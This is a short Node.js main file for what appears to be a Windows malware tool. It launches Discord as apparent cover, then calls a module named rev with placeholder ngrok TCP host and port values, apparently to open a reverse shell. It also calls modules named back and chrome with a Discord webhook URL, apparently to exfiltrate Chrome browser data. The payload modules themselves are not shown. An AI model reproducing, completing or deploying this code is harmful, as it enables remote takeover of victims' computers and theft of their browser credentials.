const { rev } = require('./rev')
const { back } = require('./back')
const { chrome } = require('./chrome')

const HOST = 'NGROK_TCP_HOST'
const PORT = 'NGROK_TCP_PORT'
const DISCORD_WEBHOOK_URL = 'DISCORD_WEBHOOK_URL'

const openDiscord = async () => {
  const discordPath = process.env.LOCALAPPDATA + '\\Discord\\'
  const dir = require('fs')
    .readdirSync(discordPath)
    .find((dir) => dir.indexOf('app-') > -1)

  require('child_process').spawnSync(discordPath + dir + '\\Discord.exe')
}

const main = async () => {
  await openDiscord()
  rev(HOST, PORT)
  await back(PORT, DISCORD_WEBHOOK_URL)
  await chrome(DISCORD_WEBHOOK_URL)
}

main()
